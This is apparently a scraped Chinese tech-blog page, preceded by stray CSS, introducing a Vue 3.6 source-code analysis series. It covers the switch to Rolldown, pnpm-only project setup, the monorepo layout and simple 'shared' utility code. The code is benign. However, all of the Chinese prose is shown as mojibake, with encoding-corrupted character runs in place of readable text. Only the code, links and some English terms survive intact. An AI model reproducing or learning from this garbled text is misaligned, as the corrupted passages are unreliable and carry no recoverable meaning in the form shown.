li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘åœ¨å°è¯•è§£æ Vue 3.6 çš„æºç ï¼Œå‰äº›å¤©ä»åº•å±‚æ„å»ºç³»ç»Ÿç€æ‰‹ï¼Œè¾›è¾›è‹¦è‹¦åˆ†æäº† Vue æ˜¯å¦‚ä½•é€šè¿‡ Rollup å’Œ esbuild æ¥åˆ†åˆ«æ„å»ºå‡ºç”Ÿäº§ç¯å¢ƒã€å¼€å‘ç¯å¢ƒäº§ç‰©çš„ï¼Œå¹¶ç²¾å¿ƒæ²‰æ·€å‡ºäº†ç¬¬ä¸€ç¯‡æŠ€æœ¯æ–‡ç« ã€‚</p>
<p>ä»Šå¤©ä¸€çœ‹å¤©å¡Œäº† â€”â€”â€”â€” Vue 3.6 beta5 å¼€å§‹æŠŠå…¨çº¿æ„å»ºå·¥å…·ç»Ÿä¸€ä¸ºäº† <a href="https://link.juejin.cn?target=https%3A%2F%2Frolldown.rs%2F" target="_blank" title="https://rolldown.rs/" ref="nofollow noopener noreferrer">Rolldown</a>ï¼Œæ‰€æœ‰æ„å»ºç›¸å…³çš„è„šæœ¬å‡è¢«æ”¹å†™ï¼Œæ„å‘³ç€æˆ‘ä¹‹å‰æ¡ˆç‰åŠ³å½¢è¿›è¡Œçš„åˆ†æã€å†™çš„æ–‡ç« å¥½åƒæ‰“äº†æ°´æ¼‚ã€‚</p>
<p>è¿™ç®€ç›´æ¯”é»„é‡‘æš´è·Œæ›´è®©æˆ‘å¿ƒç–¼ï¼ï¼ï¼ˆå› ä¸ºæˆ‘å…¶å®ä¹Ÿæ²¡ä¹°ï¼‰ã€‚</p>
<blockquote>
<p>å®˜æ–¹æ”¹åŠ¨å…·ä½“è§ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fcore%2Fcommit%2F7da7615fb68c28433006f748100a99937133d809" target="_blank" title="https://github.com/vuejs/core/commit/7da7615fb68c28433006f748100a99937133d809" ref="nofollow noopener noreferrer">Commit - build: use rolldown</a>ã€‚</p>
</blockquote>
<p>Rolldown ç›®å‰å¤„äº RC é¢„å‘å¸ƒå€™é€‰ç‰ˆæœ¬ï¼Œæ‰€ä»¥æ²¡é¢„æ–™åˆ° Vue è¿™ä¹ˆå¿«å°±å°†å…¶åº”ç”¨åœ¨æºç æ„å»ºä¸Šï¼Œç›²çŒœå…¶åŸå› ä¸ºï¼š</p>
<ul>
<li>Rolldown åœ¨ Vite ç”Ÿæ€å†…éƒ¨å·²ç»ç»å†äº†è¾ƒé•¿æ—¶é—´çš„çœŸå®é¡¹ç›®éªŒè¯ï¼Œå®˜æ–¹å›¢é˜Ÿå¯¹å…¶æˆç†Ÿåº¦ç›¸å¯¹æœ‰ä¿¡å¿ƒï¼Œå¾—ä»¥è¿›ä¸€æ­¥æ¨è¿›åˆ° Vue æºç ä»“åº“ä¸­é›†æˆä½¿ç”¨ã€‚</li>
<li>Rolldown æ˜¯ä½¿ç”¨ Rust ç¼–å†™çš„ç°ä»£åŒ–æ‰“åŒ…å™¨ï¼Œæ®ç§°åœ¨æ€§èƒ½ä¸Šä¼šæ¯” Rollup å¿« 10ï½30 å€ã€‚</li>
<li>Rollup çš„æ¨¡å—å›¾ä¸»è¦é¢å‘ã€Œä¸€æ¬¡æ€§æ„å»ºã€è®¾è®¡ï¼Œç¼ºä¹é¢å‘é•¿æœŸè¿è¡Œè¿›ç¨‹çš„å¢é‡æ„å»ºèƒ½åŠ›ï¼ˆè¿™æ˜¯ä¹‹å‰ä¸ºä½•è¦ä½¿ç”¨ esbuild ä½œä¸ºå¼€å‘ç¯å¢ƒæ„å»ºå·¥å…·çš„åŸå› ï¼‰ï¼›è€Œ Rolldown æŠŠæ¨¡å—å›¾è§†ä¸ºé•¿æœŸé©»ç•™çš„ä¸€ç­‰å…¬æ°‘ï¼Œä»æ¶æ„å±‚é¢æ”¯æŒç²¾ç¡®å¤±æ•ˆä¸å¢é‡é‡å»ºï¼Œå¾—ä»¥é€‚é…å¼€å‘æ€çš„é«˜é¢‘å˜æ›´åœºæ™¯ã€‚</li>
<li>å¼€å‘ç¯å¢ƒå’Œæ„å»ºç¯å¢ƒç»Ÿä¸€åªä½¿ç”¨ä¸€å¥—ã€Œæ„å»ºåº•åº§ã€ï¼Œå¯ä»¥å¤§å¹…æå‡æ„å»ºé…ç½®å’Œè„šæœ¬çš„ä¸€è‡´æ€§ï¼Œä¾‹å¦‚ä¸åŒçš„éœ€æ±‚ï¼ˆä¾‹å¦‚å ä½ç¬¦æ›¿æ¢ï¼‰ä¸å†éœ€è¦é…å¥—ä¸åŒçš„æ„å»ºæ’ä»¶ï¼Œè¿›è€Œå¤§å¹…é™ä½ç»´æŠ¤æˆæœ¬ã€‚</li>
</ul>
<p>å¯¹æ­¤ä¸ªäººå¾ˆæ¬£èµ Vue ä¸æ—¶ä¿±è¿›çš„æ€åº¦ï¼Œä¹ŸæœŸå¾… 3.6 æ­£å¼ç‰ˆæœ¬èƒ½æ—©æ—¥é¡ºåˆ©å‘å¸ƒã€‚</p>
<p>æœ€åè´´ä¸‹ Rollup æ­é… esbuild çš„ã€Œè€æ¬¾ã€æ„å»ºç³»ç»Ÿè§£ææ–‡ç« ï¼Œè¿˜æ˜¯å¯ä»¥å¸®åŠ©å¤§å®¶äº†è§£ Vue é¡¹ç›®åº•å±‚æ„å»ºçš„æµç¨‹å’ŒåŸç†ã€‚</p>
<hr/>
<p><em><strong>ã€ŠVue 3.6 beta 4 æºç è§£æ â€”â€” é¡¹ç›®ç»“æ„å’Œæ„å»ºé›å½¢ Pt.1ã€‹</strong></em></p>
<blockquote>
<p>æœ¬æ–‡åŸºäº <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fcore%2Ftree%2Fv3.6.0-beta.4" target="_blank" title="https://github.com/vuejs/core/tree/v3.6.0-beta.4" ref="nofollow noopener noreferrer">Vue 3.6 beta 4</a> ç‰ˆæœ¬ã€‚</p>
<p>æœ¬æ–‡æ¡ˆä¾‹æºç å¯åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FVaJoy%2Fvue-3.6-source-analysis%2Ftree%2F1.1.1%2Fvue" target="_blank" title="https://github.com/VaJoy/vue-3.6-source-analysis/tree/1.1.1/vue" ref="nofollow noopener noreferrer">Github ä»“åº“ï¼ˆTag 1.1.1ï¼‰</a> ä¸Šè·å–ã€‚</p>
</blockquote>
<p>Vue 3.6 çš„æºç å¹¶ä¸æ˜¯ä¸€ä¸ªå•ä½“é¡¹ç›®ï¼Œè€Œæ˜¯ä¸€ä¸ªé«˜åº¦æ¨¡å—åŒ–ã€å·¥ç¨‹åŒ–çš„ç³»ç»Ÿã€‚åœ¨æ­£å¼æ·±å…¥åˆ†æå„ä¸ªæ ¸å¿ƒæ¨¡å—ä¹‹å‰ï¼Œå¦‚æœä¸å…ˆç†è§£å…¶æ•´ä½“çš„é¡¹ç›®ç»“æ„ä¸å·¥ç¨‹å½¢æ€ï¼Œå¾ˆå®¹æ˜“åœ¨é˜…è¯»æºç æ—¶é™·å…¥å±€éƒ¨å®ç°ç»†èŠ‚ï¼Œè€Œç¼ºä¹å¯¹æ•´ä½“è®¾è®¡ä¸æ¨¡å—åä½œå…³ç³»çš„æŠŠæ¡ã€‚</p>
<p>ä½œä¸ºæœ¬ä¸“æ çš„å¼€ç¯‡ï¼Œæœ¬æ–‡å°†ä»å·¥ç¨‹è§†è§’å‡ºå‘ï¼Œä»‹ç»å¹¶è®¨è®º Vue 3.6 çš„é¡¹ç›®ç»“æ„é›å½¢ä¸æ„å»ºæŠ€æœ¯é€‰å‹ï¼Œå¹¶å®ç°ä¸€ä¸ªæœ€åŸºç¡€çš„å·¥ç¨‹åŒ–æ–¹æ¡ˆã€‚</p>
<h2 data-id="heading-0">1ã€é¡¹ç›®åˆå§‹åŒ–</h2>
<p>æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªåä¸º <code>vue</code> çš„æ–‡ä»¶å¤¹ä½œä¸ºæºç é¡¹ç›®ï¼Œæ‰§è¡Œ <code>pnpm init</code> è¿›è¡Œåˆå§‹åŒ–ã€ç”Ÿæˆ <code>package.json</code> æ–‡ä»¶ã€‚</p>
<p>Vue æºç é¡¹ç›®æ˜¯ä¸¥æ ¼è¦æ±‚ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fpnpm.io%2Finstallation%23using-npm" target="_blank" title="https://pnpm.io/installation#using-npm" ref="nofollow noopener noreferrer">pnpm</a> æ¥ä½œä¸ºåŒ…ç®¡ç†å™¨çš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ <code>package.json</code> çš„ <code>script</code> å­—æ®µæ·»åŠ  <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.npmjs.com%2Fcli%2Fv8%2Fusing-npm%2Fscripts%23npm-ci" target="_blank" title="https://docs.npmjs.com/cli/v8/using-npm/scripts#npm-ci" ref="nofollow noopener noreferrer"><code>preinstall</code></a> é’©å­æŒ‡ä»¤ï¼Œåœ¨ä½¿ç”¨è€…é€šè¿‡åŒ…ç®¡ç†å™¨å®‰è£…é¡¹ç›®ä¾èµ–æ—¶ï¼Œèƒ½è‡ªåŠ¨æ£€æŸ¥å¹¶ç¡®ä¿é¡¹ç›®åªèƒ½ä½¿ç”¨ pnpm ä½œä¸ºåŒ…ç®¡ç†å™¨ï¼š</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-string">"name"</span>: <span class="hljs-string">"vue"</span>,
  <span class="hljs-string">"version"</span>: <span class="hljs-string">"3.6.0"</span>,
  <span class="hljs-string">"type"</span>: <span class="hljs-string">"module"</span>,
  <span class="hljs-string">"scripts"</span>: {
    <span class="hljs-string">"preinstall"</span>: <span class="hljs-string">"npx only-allow pnpm"</span>    <span class="hljs-comment">// ç¡®ä¿é¡¹ç›®åªèƒ½ä½¿ç”¨ pnpm ä½œä¸ºåŒ…ç®¡ç†å™¨</span>
  },
  <span class="hljs-string">"license"</span>: <span class="hljs-string">"MIT"</span>
}
</code></pre>
<p>å…¶ä¸­ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpnpm%2Fonly-allow" target="_blank" title="https://github.com/pnpm/only-allow" ref="nofollow noopener noreferrer">only-allow</a> æ˜¯ pnpm å®˜æ–¹æä¾›çš„ä¸€ä¸ªæ£€æµ‹å·¥å…·ï¼Œå¯ä»¥æ£€æµ‹å½“å‰é¡¹ç›®æ˜¯å¦ä½¿ç”¨äº†æŒ‡å®šçš„åŒ…ç®¡ç†å™¨ï¼ˆè‹¥ä¸ç¬¦åˆæ¡ä»¶ä¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpnpm%2Fonly-allow%2Fblob%2Fmaster%2Fbin.js%23L24" target="_blank" title="https://github.com/pnpm/only-allow/blob/master/bin.js#L24" ref="nofollow noopener noreferrer">æŠ¥é”™å¹¶å¼ºè¡Œé€€å‡ºç¨‹åº</a>ï¼‰ã€‚</p>
<p>åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.npmjs.com%2Fcli%2Fv8%2Fusing-npm%2Fscripts%23npm-ci" target="_blank" title="https://docs.npmjs.com/cli/v8/using-npm/scripts#npm-ci" ref="nofollow noopener noreferrer"><code>preinstall</code></a> é’©å­ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡ <code>npx only-allow pnpm</code> æ¥ç¡®ä¿é¡¹ç›®åªèƒ½ä½¿ç”¨ pnpm ä½œä¸ºåŒ…ç®¡ç†å™¨ã€‚</p>
<blockquote>
<p>ğŸ’¡ Vue æ˜¯åŸºäº Monorepo æ¶æ„æ¥ç»´æŠ¤å„æ¨¡å—çš„ï¼Œè€Œ pnpm å¯¹ Monorepo æœ‰å¾ˆå¥½çš„æ”¯æŒï¼Œæˆ‘ä»¬ä¼šåœ¨åæ–‡äº†è§£åˆ°è¿™ä¸€ç‚¹ã€‚</p>
</blockquote>
<h2 data-id="heading-1">2ã€Monorepo</h2>
<h3 id="user-content-md-monorepo" data-id="heading-2">2.1 Vue ä¸­çš„ Monorepo</h3>
<p>åœ¨ä¸šåŠ¡é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>npm install vue</code> <a href="https://link.juejin.cn?target=https%3A%2F%2Fvuejs.org%2Fguide%2Fquick-start.html%23creating-a-vue-application" target="_blank" title="https://vuejs.org/guide/quick-start.html#creating-a-vue-application" ref="nofollow noopener noreferrer">ç­‰æ–¹å¼</a>æ¥ä¸‹è½½å’Œä½¿ç”¨ Vueï¼Œä¸è¿‡ Vue é™¤äº†è¿™ä¸ªè¦†ç›–å®Œæ•´åŠŸèƒ½çš„ npm åŒ…ï¼Œè¿˜æä¾›äº†å¤šä¸ªç‹¬ç«‹çš„æ ¸å¿ƒå­æ¨¡å—åŒ…ï¼Œæ¯ä¸ªåŒ…éƒ½æœ‰å…¶ç‰¹å®šçš„åŠŸèƒ½å’Œä½œç”¨ï¼š</p>
<ul>
<li><code>@vue/shared</code>ï¼šVue 3 ä¸­è¢«å„æ¨¡å—å…±äº«çš„å·¥å…·å‡½æ•°æ¨¡å—ã€‚</li>
<li><code>@vue/reactivity</code>ï¼šVue 3 çš„å“åº”å¼æ¨¡å—ã€‚</li>
<li><code>@vue/compiler-core</code>ï¼šVue 3 çš„æ¨¡æ¿ç¼–è¯‘æ ¸å¿ƒæ¨¡å—ã€‚</li>
<li><code>@vue/compiler-dom</code>ï¼šVue 3 çš„ DOM ç¼–è¯‘æ¨¡å—ã€‚</li>
<li><code>@vue/runtime-core</code>ï¼šVue 3 çš„è¿è¡Œæ—¶æ ¸å¿ƒæ¨¡å—ã€‚</li>
<li>...</li>
</ul>
<p>ä¾‹å¦‚ä½ å¯ä»¥åœ¨ä¸šåŠ¡é¡¹ç›®ä¸­ç‹¬ç«‹ä¸‹è½½ Vue çš„å“åº”å¼æ¨¡å— <code>@vue/reactivity</code>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm install @vue/reactivity
</code></pre>
<p>å¹¶åœ¨é¡¹ç›®ä¸­ä½¿ç”¨å®ƒï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'@vue/reactivity'</span>

<span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({ <span class="hljs-attr">msg</span>: <span class="hljs-string">'hi'</span> })
</code></pre>
<p>æ­¤ä¸¾ä»…ä¼šä¸‹è½½ <code>@vue/reactivity</code> æ¨¡å—ï¼ˆåŠå…¶ä¾èµ–æ¨¡å—ï¼‰çš„ä»£ç ï¼Œè€Œä¸ä¼šä¸‹è½½ Vue çš„æ‰€æœ‰æ¨¡å—ã€‚</p>
<p>ç„¶è€Œ Vue å¹¶æ²¡æœ‰ç»™æ¯ä¸ªæ ¸å¿ƒå­æ¨¡å—éƒ½ç‹¬ç«‹åˆ›å»ºä¸€ä¸ª Git ä»“åº“ï¼Œè€Œæ˜¯å°†å®ƒä»¬ç»Ÿä¸€æ”¾åœ¨ Vue æºç é¡¹ç›®çš„ <code>packages</code> æ–‡ä»¶å¤¹ä¸‹è¿›è¡Œç»´æŠ¤ï¼š</p>
<pre><code class="hljs language-js" lang="js">vue
â”œâ”€â”€ packages
â”‚   â”œâ”€â”€ shared
â”‚   â”œâ”€â”€ reactivity
â”‚   â”œâ”€â”€ compiler-core
â”‚   â”œâ”€â”€ compiler-dom
â”‚   â”œâ”€â”€ runtime-core
â”‚   â”œâ”€â”€ ...
</code></pre>
<p>æ­¤ç±»ã€Œå•ä»“åº“å¤šæ¨¡å—ã€çš„æ¶æ„å½¢å¼ï¼Œè¢«ç§°ä¸º <a href="https://link.juejin.cn?target=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FMonorepo" target="_blank" title="https://en.wikipedia.org/wiki/Monorepo" ref="nofollow noopener noreferrer">Monorepo</a> ã€‚</p>
<h3 data-id="heading-3">2.2 ä»¥ <code>shared</code> ä¸ºä¾‹çš„æ¨¡å—ç»“æ„</h3>
<p>ä»¥ã€Œå…±äº«å·¥å…·å‡½æ•°æ¨¡å—ã€<code>shared</code> ä¸ºä¾‹ï¼Œå…¶ç›®å½•ç»“æ„ <code>packages/shared</code> éå¸¸ç®€ç»ƒï¼š</p>
<pre><code class="hljs language-js" lang="js">vue
â”œâ”€â”€ packages
â”‚   â”œâ”€â”€ shared
â”‚   â”‚   â”œâ”€â”€ src           <span class="hljs-comment">// å­˜æ”¾å®é™…æºç </span>
â”‚   â”‚   â”‚   â”œâ”€â”€ general.<span class="hljs-property">ts</span>
â”‚   â”‚   â”‚   â”œâ”€â”€ makeMap.<span class="hljs-property">ts</span>
â”‚   â”‚   â”‚   â”œâ”€â”€ ...
â”‚   â”‚   â”‚   â””â”€â”€ index.<span class="hljs-property">ts</span>
â”‚   â”‚   â”œâ”€â”€ package.<span class="hljs-property">json</span>  <span class="hljs-comment">// npm åŒ…é…ç½®</span>
â”‚   â”‚   â””â”€â”€ index.<span class="hljs-property">ts</span>      <span class="hljs-comment">// åŒ…å…¥å£</span>
</code></pre>
<h4 data-id="heading-4">src æ–‡ä»¶å¤¹</h4>
<p><code>shared/src</code> æ–‡ä»¶å¤¹ç”¨äºå­˜æ”¾ <code>shared</code> æ¨¡å—å®é™…çš„æºç æ–‡ä»¶ï¼Œæºç æ–‡ä»¶ä¼šæŒ‰åŠŸèƒ½ç»´åº¦æ‹†åˆ†æˆå¤šä¸ªå­æ¨¡å—ã€‚</p>
<p>ç®€å•èµ·è§ï¼Œæˆ‘ä»¬ç›®å‰åªå®ç° <code>shared/src/general.ts</code> å’Œ <code>shared/src/makeMap.ts</code> ä¸¤ä¸ªåŠŸèƒ½å­æ¨¡å—ï¼Œå®ƒä»¬çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/** shared/src/makeMap.ts **/</span>

<span class="hljs-comment">/**
 * æŠŠä¸€ä¸ªç”¨é€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚ "a,b,c" ï¼‰é¢„å¤„ç†æˆä¸€ä¸ªâ€œæˆå‘˜åˆ¤æ–­å‡½æ•°â€ï¼Œ
 * ç”¨äºåœ¨è¿è¡Œæ—¶é«˜é¢‘åœ°åˆ¤æ–­æŸä¸ª key æ˜¯å¦å±äºæŸä¸ªå›ºå®šé›†åˆã€‚
 * 
 * ç¤ºä¾‹ï¼š
 * const isHTMLTag = makeMap('div,span,p')
 * isHTMLTag('div') // true
 * isHTMLTag('a')   // false
 */</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">makeMap</span>(<span class="hljs-params">str: string</span>): <span class="hljs-function">(<span class="hljs-params">key: string</span>) =&gt;</span> boolean {
  <span class="hljs-keyword">const</span> map = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>)
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">of</span> str.<span class="hljs-title function_">split</span>(<span class="hljs-string">','</span>)) map[key] = <span class="hljs-number">1</span>
  <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-params">val</span> =&gt;</span> val <span class="hljs-keyword">in</span> map
}
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/** shared/src/general.ts **/</span>

<span class="hljs-keyword">import</span> { makeMap } <span class="hljs-keyword">from</span> <span class="hljs-string">'./makeMap'</span>

<span class="hljs-comment">/** ç©ºå¯¹è±¡ */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">EMPTY_OBJ</span>: { readonly [<span class="hljs-attr">key</span>: string]: any } = {}

<span class="hljs-comment">/** ç©ºæ•°ç»„ */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">EMPTY_ARR</span>: readonly never[] = []

<span class="hljs-comment">/** ç©ºå‡½æ•° */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">NOOP</span> = (): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {}

<span class="hljs-comment">/** ç”Ÿæˆä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºåˆ¤æ–­ä¸€ä¸ªå±æ€§åæ˜¯å¦æ˜¯ä¿ç•™å±æ€§ */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">isReservedProp</span>: <span class="hljs-function">(<span class="hljs-params">key: string</span>) =&gt;</span> boolean = <span class="hljs-comment">/*@__PURE__*/</span> <span class="hljs-title function_">makeMap</span>(
  <span class="hljs-string">',key,ref,ref_for,ref_key,'</span> +
    <span class="hljs-string">'onVnodeBeforeMount,onVnodeMounted,'</span> +
    <span class="hljs-string">'onVnodeBeforeUpdate,onVnodeUpdated,'</span> +
    <span class="hljs-string">'onVnodeBeforeUnmount,onVnodeUnmounted'</span>,
)
</code></pre>
<p>æ¥ç€æˆ‘ä»¬åœ¨æ¨¡å—çš„å†…éƒ¨å‡ºå£æ–‡ä»¶ <code>shared/src/index.ts</code> ä¸­ï¼Œå¯¼å‡ºæ‰€æœ‰åŠŸèƒ½å­æ¨¡å—ï¼ˆç›®å‰ä»… <code>general</code> å’Œ <code>makeMap</code>ï¼‰çš„æ¥å£ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/** shared/src/index.ts **/</span>

<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./general'</span>
<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./makeMap'</span>
</code></pre>
<p>åç»­ä»…éœ€å¼•ç”¨è¯¥å‡ºå£æ–‡ä»¶ï¼Œå°±èƒ½é€šè¿‡ã€Œä¸€æ‹–å¤šã€çš„å½¢å¼é—´æ¥å¼•å…¥ <code>shared</code> æ¨¡å—çš„å…¨éƒ¨åŠŸèƒ½æ¥å£ã€‚</p>
<h4 id="user-content-md-dist" data-id="heading-5">å¾…æ„å»ºçš„ dist æ–‡ä»¶å¤¹</h4>
<p>ä½œä¸ºä¸€ä¸ªè¢«å¤šè¿è¡Œæ—¶ã€å¤šæ„å»ºç¯å¢ƒå¤ç”¨çš„åŸºç¡€å·¥å…·æ¨¡å—ï¼Œé€šå¸¸éœ€è¦æä¾›å¤šç§æ„å»ºæ ¼å¼ï¼ˆä¾‹å¦‚ ESMã€CJS ç­‰ï¼‰ï¼Œä»¥é€‚é…ä¸åŒçš„åŠ è½½æ–¹å¼ä¸è¿è¡Œåœºæ™¯ã€‚</p>
<p>å¯¹äº <code>shared</code> æ¨¡å—è€Œè¨€ï¼Œå…¶èŒè´£æ˜¯ä¸º Vue å„æ ¸å¿ƒåŒ…æä¾›æœ€åŸºç¡€ã€æœ€é€šç”¨çš„å·¥å…·èƒ½åŠ›ï¼Œå› æ­¤éœ€è¦å°† <code>shared/src</code> ä¸‹çš„æºç æ„å»ºä¸ºå¤šç§äº§å‡ºç‰©ï¼Œä»¥è¦†ç›–ä»¥ä¸‹å‡ ç±»å…¸å‹ä½¿ç”¨åœºæ™¯ï¼š</p>
<ul>
<li>
<p><strong>å¼€å‘ç¯å¢ƒä¸‹çš„ CommonJS å¼•ç”¨</strong></p>
<p>å³é€šè¿‡ <code>require('@vue/shared')</code> å¼•å…¥ <code>shared</code> æ¨¡å—ï¼Œä¸”è¿è¡Œäºå¼€å‘ç¯å¢ƒï¼ˆ<code>process.env.NODE_ENV === 'development'</code>ï¼‰çš„åœºæ™¯ï¼Œéœ€ç¡®ä¿æ‰€å¼•ç”¨çš„ <code>shared</code> æ¨¡å—äº§å‡ºç‰©ä¸º CommonJS ç‰ˆæœ¬ï¼Œä¸”åŒ…å«ç”¨äºå¼€å‘æœŸçš„è°ƒè¯•é€»è¾‘ï¼ˆå¦‚ warningã€assert ç­‰ï¼‰ã€‚</p>
<p>æˆ‘ä»¬æ‹Ÿå®šè¯¥äº§å‡ºç‰©åä¸º <code>shared.cjs.js</code>ã€‚</p>
</li>
<li>
<p><strong>ç”Ÿäº§ç¯å¢ƒä¸‹çš„ CommonJS å¼•ç”¨</strong></p>
<p>å³åŒæ ·é€šè¿‡ <code>require('@vue/shared')</code> å¼•å…¥ <code>shared</code> æ¨¡å—ï¼Œä½†è¿è¡Œäºç”Ÿäº§ç¯å¢ƒçš„åœºæ™¯ï¼Œéœ€ç¡®ä¿æ‰€å¼•ç”¨çš„ <code>shared</code> æ¨¡å—äº§å‡ºç‰©ä¸º CommonJS ç‰ˆæœ¬ï¼Œä¸”å‰”é™¤äº†æ‰€æœ‰ç”¨äºå¼€å‘æœŸçš„è°ƒè¯•é€»è¾‘ï¼ˆç¡®ä¿æœ€ç»ˆä»£ç ä½“ç§¯æœ€å°ï¼‰ã€‚</p>
<p>æˆ‘ä»¬æ‹Ÿå®šè¯¥äº§å‡ºç‰©åä¸º <code>shared.cjs.prod.js</code>ã€‚</p>
</li>
<li>
<p><strong>ESM å¼•ç”¨ï¼ˆBundler åœºæ™¯ï¼‰</strong></p>
<p>å³é€šè¿‡ <code>import</code> å¼•å…¥ <code>shared</code> æ¨¡å—çš„åœºæ™¯ï¼Œéœ€ç¡®ä¿æ‰€å¼•ç”¨çš„ <code>shared</code> æ¨¡å—äº§å‡ºç‰©ä¸º ESM bundler ç‰ˆæœ¬ã€‚</p>
<p>æˆ‘ä»¬æ‹Ÿå®šè¯¥äº§å‡ºç‰©åä¸º <code>shared.esm-bundler.js</code>ã€‚</p>
<blockquote>
<p>ğŸ’¡ ä¸ CommonJS ä¸åŒï¼ŒESM ç‰ˆæœ¬å¹¶ä¸ä¼šæ‹†åˆ†å‡ºã€Œå¼€å‘ç¯å¢ƒã€å’Œã€Œç”Ÿäº§ç¯å¢ƒã€ä¸¤å¥—æ–‡ä»¶ã€‚</p>
<p>ğŸ’¡ è¿™å¾—ç›Šäº ESM çš„é™æ€å¯¼å…¥ç‰¹æ€§ï¼ŒVue æ¡†æ¶ä½¿ç”¨è€…åœ¨ä¸šåŠ¡ä¾§è¿›è¡ŒäºŒæ¬¡æ„å»ºçš„è¿‡ç¨‹ä¸­ï¼Œæ„å»ºå·¥å…·å¯åœ¨ç¼–è¯‘æœŸå°†ç¯å¢ƒå˜é‡æ›¿æ¢ä¸ºå¸¸é‡ï¼Œå¹¶é€šè¿‡ Tree-shaking / Dead Code Elimination ç²¾ç¡®ç§»é™¤ä¸å¯è¾¾çš„ç¯å¢ƒé€»è¾‘ï¼Œä»è€Œä¿è¯æœ€ç»ˆç”Ÿäº§ä»£ç ä¸­ä¸å­˜åœ¨ä»»ä½•å†—ä½™åˆ†æ”¯ã€‚</p>
</blockquote>
</li>
</ul>
<p>åœ¨åæ–‡æˆ‘ä»¬ä¼šé€šè¿‡æ„å»ºå·¥å…·ï¼Œå°† <code>shared/src</code> çš„æºæ–‡ä»¶æ„å»ºå‡ºé€‚é…ä¸Šè¿°ä¸‰ä¸ªåœºæ™¯çš„äº§å‡ºç‰©ï¼Œå¹¶åˆ›å»º <code>shared/dist</code> æ–‡ä»¶å¤¹æ¥å­˜æ”¾è¿™äº›äº§ç‰©ã€‚</p>
<p>å¦å¤–æˆ‘ä»¬ä¹Ÿå°†ä¸º <code>shared</code> æ¨¡å—æ„å»ºå…¶ TypeScript å£°æ˜æ–‡ä»¶ <code>shared/dist/shared.d.ts</code>ï¼Œç”¨äºåœ¨ TypeScript é¡¹ç›®ä¸­æä¾›ç±»å‹æ£€æŸ¥ä¸æ™ºèƒ½æç¤ºã€‚</p>
<h4 data-id="heading-6">npm åŒ…å…¥å£æ–‡ä»¶</h4>
<p><code>shared/index.ts</code> æ˜¯ <code>shared</code> æ¨¡å—çš„åŒ…å…¥å£æ–‡ä»¶ï¼Œåœ¨ä¸‹æ–‡å°†ä»‹ç»çš„ <code>shared/package.json</code> ä¸­ä¼šé€šè¿‡ <code>main</code> å­—æ®µæŒ‡å®šè¯¥æ–‡ä»¶ä¸º CommonJS ç”Ÿæ€ä¸‹çš„ä¼ ç»Ÿå…¥å£ã€‚</p>
